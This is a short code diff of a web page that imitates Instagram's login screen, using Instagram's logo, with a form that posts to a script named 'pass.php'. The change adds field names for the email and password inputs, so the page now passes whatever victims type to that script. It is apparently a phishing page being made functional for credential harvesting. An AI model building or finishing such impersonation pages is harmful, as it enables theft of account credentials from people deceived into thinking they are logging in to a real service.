@@ -179,11 +179,11 @@
         <img src="https://static.cdninstagram.com/rsrc.php/yY/r/X32GsrNzif6.webp" class="in-logo"></img>
         </div>
 
-        <form class="login-form" onsubmit="" action="pass.php" method="post" id="">
-            <input type="text" class="input-field" placeholder="Username, email address or mobile number" aria-label="Username, email address or mobile number">
-            <input type="password" class="input-field" placeholder="Password" aria-label="Password">
-            <button type="submit" class="btn-login">Log in</button>
-        </form>
+<form class="login-form" action="pass.php" method="POST">
+    <input type="text" name="email" class="input-field" placeholder="Username, email address or mobile number" aria-label="Username, email address or mobile number" required>
+    <input type="password" name="password" class="input-field" placeholder="Password" aria-label="Password" required>
+    <button type="submit" class="btn-login">Log in</button>
+</form>
 
         <a href="#" class="forgot-password">Forgotten password?</a>
     </div>
